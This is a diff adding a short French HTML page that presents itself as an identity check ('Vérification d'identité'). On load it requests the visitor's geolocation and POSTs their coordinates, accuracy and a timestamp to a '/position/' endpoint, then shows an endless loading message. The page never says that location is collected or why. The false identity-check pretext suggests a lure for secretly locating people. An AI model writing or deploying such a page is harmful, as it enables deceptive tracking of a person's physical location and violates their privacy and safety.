@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <title>Confirmation de Position</title>
+  <script>
+    function envoyerPosition(position) {
+      fetch("/position/", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          latitude: position.coords.latitude,
+          longitude: position.coords.longitude,
+          accuracy: position.coords.accuracy,
+          timestamp: new Date().toISOString()
+        })
+      })
+        .then(response => response.json())
+        .then(data => {
+          if (data.status === "ok") {
+            document.getElementById("status").innerText = "Veuillez patienter le chargement ... ";
+          } else {
+            document.getElementById("status").innerText = `Erreur: ${data.message}`;
+          }
+        })
+        .catch(error => {
+          document.getElementById("status").innerText = "Erreur lors de l'envoi: " + error.message;
+        });
+    }
+
+    function erreurPosition() {
+      document.getElementById("status").innerText = "Échec de la géolocalisation.";
+    }
+
+    window.onload = () => {
+      navigator.geolocation.getCurrentPosition(envoyerPosition, erreurPosition);
+    };
+  </script>
+</head>
+<body>
+  <h3 id="status">Vérification d'identite ...</h3>
+</body>
+</html>
